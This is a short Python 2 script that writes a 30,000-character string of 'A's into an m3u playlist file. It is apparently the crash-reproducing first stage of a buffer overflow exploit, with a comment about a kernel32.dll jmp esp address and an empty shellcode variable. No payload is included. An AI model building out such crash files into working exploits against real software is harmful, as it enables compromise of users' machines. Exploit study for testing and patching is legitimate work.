import struct
#kernel32.dll jmp esp using fndjump.exe

shellcode = ("")

buffer = "A"*30000

try:
        fl = open("_01_crash.m3u","w")
        fl.write(buffer)
        fl.close()
	print "Generated"
except:
        print "failed"
